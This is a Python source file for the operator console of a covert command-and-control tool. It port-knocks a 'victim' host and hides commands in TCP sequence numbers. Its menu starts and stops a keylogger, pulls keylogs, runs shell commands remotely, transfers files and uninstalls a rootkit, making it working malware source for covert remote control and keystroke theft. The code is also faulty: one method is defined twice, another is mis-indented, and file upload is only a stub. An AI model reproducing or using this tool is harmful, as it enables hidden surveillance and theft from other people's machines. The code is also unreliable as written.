#!/usr/bin/env python3
import sys
import time
import threading
import socket
import os
from scapy.all import IP, TCP, send, sniff
from port_knocker import PortKnocker

class Commander:
    def __init__(self):
        # Connection state
        self.target_ip = None
        self.tx_port = None
        self.rx_port = None
        self.is_connected = False
        self.knocker = None
        
        # Output handling
        self.output_lock = threading.Lock()
        self.running = True
        
        # Dispatch tables for menu actions
        self.disconnected_actions = {
            "1": self.handle_initiate,
            "0": self.handle_exit
        }
        
        self.connected_actions = {
            "1": self.handle_start_keylogger,
            "2": self.handle_stop_keylogger,
            "3": self.handle_get_log,
            "4": self.handle_exec,
            "5": self.handle_put_file,
            "6": self.handle_get_file,
            "7": self.handle_watch,
            "8": self.handle_uninstall,
            "9": self.handle_disconnect,
            "0": self.handle_exit
        }

    def send_covert_command(self, cmd_type, data=""):
        """Encodes ASCII characters into the TCP Sequence Number."""
        if not self.is_connected:
            print("[!] Not connected. Initiate session first.")
            return False

        payload = f"{cmd_type}:{data}\0"
        for char in payload:
            try:
                pkt = IP(dst=self.target_ip)/TCP(
                    sport=self.rx_port, 
                    dport=self.tx_port, 
                    seq=ord(char), 
                    flags="A"
                )
                send(pkt, verbose=False)
                time.sleep(0.01)
            except Exception as e:
                print(f"[!] Error sending packet: {e}")
                return False
        return True

    def handle_initiate(self):
        """Option 1 (Disconnected): Port knock to initiate session."""
        # Ask for IP HERE, not at startup (matching Rust example)
        target_input = input("Target IP [127.0.0.1]: ").strip()
        self.target_ip = target_input if target_input else "127.0.0.1"
        
        # Validate IP
        try:
            socket.inet_aton(self.target_ip)
        except socket.error:
            print("[!] Invalid IP address.")
            return
        
        print(f"[*] Sending knock sequence to {self.target_ip}...")
        
        # Create knocker and execute knock
        self.knocker = PortKnocker(self.target_ip)
        self.tx_port, self.rx_port = self.knocker.execute_knock()
        
        if self.tx_port:
            self.is_connected = True
            # Start background thread for incoming covert traffic
            threading.Thread(
                target=self.start_output_listener, 
                daemon=True,
                name="OutputListener"
            ).start()
            print(f"\n[+] Covert Channel Established (TX:{self.tx_port} / RX:{self.rx_port})")
            print(f"[+] Connected to {self.target_ip}")
        else:
            print("[!] Knock failed. Check if victim is running.")

    def display_output(self, timeout=3):
        
        start_time = time.time()
        last_buffer_len = 0
        
        while time.time() - start_time < timeout:
            time.sleep(0.2)
            with self.output_lock:
                if len(self.output_buffer) == last_buffer_len:
                    # No new data for 0.2 seconds, consider it complete
                    if last_buffer_len > 0:
                        break
                last_buffer_len = len(self.output_buffer)
        
        # Print the buffered output
        with self.output_lock:
            if self.output_buffer:
                print(self.output_buffer, end='')
                self.output_buffer = ""
            else:
                print("[No output]")
        
        print("="*50 + "\n")

    def start_output_listener(self):
    """Continuous sniffer for the RX port to print covert data."""
    self.output_buffer = ""  # Initialize buffer
    def process_packet(pkt):
        if pkt.haslayer(TCP) and pkt[TCP].dport == self.rx_port:
            char_code = pkt[TCP].seq % 256
            if char_code != 0:
                with self.output_lock:
                    self.output_buffer += chr(char_code)

    try:
        sniff(
            filter=f"tcp dst port {self.rx_port}", 
            prn=process_packet,
            stop_filter=lambda x: not self.is_connected
        )
    except Exception as e:
        if self.is_connected:
            print(f"\n[!] Listener error: {e}")

    def display_output(self, timeout=3):
        """Wait for and display buffered output."""
        start_time = time.time()
        last_buffer_len = 0
        
        while time.time() - start_time < timeout:
            time.sleep(0.2)
            with self.output_lock:
                if len(self.output_buffer) == last_buffer_len:
                    if last_buffer_len > 0:
                        break
                last_buffer_len = len(self.output_buffer)
        
        with self.output_lock:
            if self.output_buffer:
                print(self.output_buffer, end='')
                self.output_buffer = ""
            else:
                print("[No response from victim]")
        print("="*50 + "\n")

    def handle_start_keylogger(self):
        """Option 1: Start the keylogger on the victim."""
        with self.output_lock:
            self.output_buffer = ""
        print("[*] Starting keylogger on victim...")
        self.send_covert_command("START_KEY")
        time.sleep(0.5)
        print("[*] Waiting for confirmation...")
        self.display_output(timeout=2)

    def handle_stop_keylogger(self):
        """Option 2: Stop the keylogger and delete log file."""
        with self.output_lock:
            self.output_buffer = ""
        print("[*] Stopping keylogger on victim...")
        self.send_covert_command("STOP_KEY")
        time.sleep(0.5)
        print("[*] Waiting for confirmation...")
        self.display_output(timeout=2)

    def handle_get_log(self):
        """Option 3: Transfer the key log file from the victim and save locally (Silent)."""
        with self.output_lock:
            self.output_buffer = ""
        
        # Generate a timestamped filename for the keylog
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        save_dir = "./keylogs"
        os.makedirs(save_dir, exist_ok=True)
        save_path = f"{save_dir}/keylog_{self.target_ip}_{timestamp}.txt"
        
        print(f"[*] Requesting keylog file from {self.target_ip}...")
        self.send_covert_command("GET_LOG")
        
        # Wait for data silently
        start_time = time.time()
        last_buffer_len = 0
        timeout = 10  # Increased timeout for larger files
        
        while time.time() - start_time < timeout:
            time.sleep(0.3)
            with self.output_lock:
                current_len = len(self.output_buffer)
                if current_len == last_buffer_len and current_len > 0:
                    # No new data for 0.3 seconds, consider transfer complete
                    break
                last_buffer_len = current_len
        
        # Save the received data to file (Silent)
        with self.output_lock:
            if self.output_buffer:
                # Strip the KEYLOG markers if present
                content = self.output_buffer.replace("=== KEYLOG START ===\n", "")
                content = content.replace("=== KEYLOG END ===\n", "")
                
                with open(save_path, "w") as f:
                    f.write(content)
                
                print(f"[+] Keylog transferred and saved to: {save_path}")
                print(f"[+] Total bytes received: {len(content)}")
                self.output_buffer = ""
            else:
                print("[!] No keylog data received")

    def handle_exec(self):
        """Option 4: Run program and display output."""
        cmd = input("shell> ").strip()
        if not cmd:
            return
        
        # Clear any previous output
        with self.output_lock:
            self.output_buffer = ""
        
        print(f"[*] Executing '{cmd}' on victim...")
        self.send_covert_command("EXEC", cmd)
        
        # Wait for and display output
        self.display_output(timeout=5)

    def handle_put_file(self):
        """Option 5: Transfer a file TO the victim."""
        filename = input("Local file to upload: ").strip()
        if not filename:
            print("[!] No file specified.")
            return
        if os.path.exists(filename):
            print(f"[*] Uploading {filename} to victim...")
            self.send_covert_command("PUT", filename)
            print("[!] Note: Filename sent. Full content transfer requires protocol extension.")
        else:
            print(f"[!] File '{filename}' not found.")
        time.sleep(0.3)

    def handle_get_file(self):
        """Option 6: Transfer a file FROM the victim."""
        filename = input("Remote file to download: ").strip()
        if not filename:
            print("[!] No file specified.")
            return
        print(f"[*] Requesting {filename} from victim...")
        self.send_covert_command("GET", filename)
        print("\n[*] Waiting for file data (output will appear above)...")
        time.sleep(1)

    def handle_watch(self):
        """Option 7: Watch a file/directory on the victim."""
        path = input("Remote path to watch: ").strip()
        if not path:
            print("[!] No path specified.")
            return
        print(f"[*] Watching {path} on victim...")
        self.send_covert_command("WATCH", path)
        print("[*] Changes will be reported via covert channel.")
        time.sleep(0.3)

    def handle_uninstall(self):
        """Option 8: Uninstall rootkit from the victim."""
        confirm = input("Are you sure you want to uninstall? (y/n): ").strip().lower()
        if confirm == 'y':
            print("[*] Uninstalling rootkit from victim...")
            self.send_covert_command("UNINSTALL")
            self.is_connected = False
            time.sleep(1)
            print("[+] Uninstall signal sent.")
        else:
            print("[!] Uninstall cancelled.")

    def handle_disconnect(self):
        """Option 9: Disconnect from the victim."""
        print("[*] Disconnecting from victim...")
        self.send_covert_command("EXIT")
        self.is_connected = False
        time.sleep(0.3)
        print("[+] Session closed.")

    def handle_exit(self):
        """Option 0: Exit the commander."""
        if self.is_connected:
            self.handle_disconnect()
        print("[*] Commander exiting.")
        self.running = False
        sys.exit(0)

    # === Menu Display Functions ===
    
    def show_disconnected_menu(self):
        """Display menu when not connected to victim."""
        print("\n=== Covert C2 Commander ===")
        print("[DISCONNECTED]")
        print("\n1) Initiate session (Port Knock)")
        print("0) Exit")

    def show_connected_menu(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"\n=== Covert C2 Commander ===")
        print(f"[CONNECTED] -> {self.target_ip}")
        print("\n1. Start Keylogger          6. Transfer File FROM Victim")
        print("2. Stop Keylogger           7. Watch File/Directory")
        print("3. Transfer Keylog File     8. Uninstall Rootkit")
        print("4. Run Program on Victim    9. Disconnect")
        print("5. Transfer File TO Victim  0. Exit")

    # === Main Loop ===
    
    def run(self):
        """The main workflow loop - matches Rust example flow."""
        while self.running:
            if not self.is_connected:
                # Disconnected state
                self.show_disconnected_menu()
                choice = input("\nSelection > ").strip()
                action = self.disconnected_actions.get(choice)
                
                if action:
                    action()
                else:
                    print("[!] Invalid selection.")
            else:
                # Connected state
                self.show_connected_menu()
                choice = input("\nSelection > ").strip()
                action = self.connected_actions.get(choice)
                
                if action:
                    action()
                else:
                    print("[!] Invalid selection.")

if __name__ == "__main__":
    try:
        cmd = Commander()
        cmd.run()
    except KeyboardInterrupt:
        print("\n[*] Commander interrupted.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        sys.exit(1)
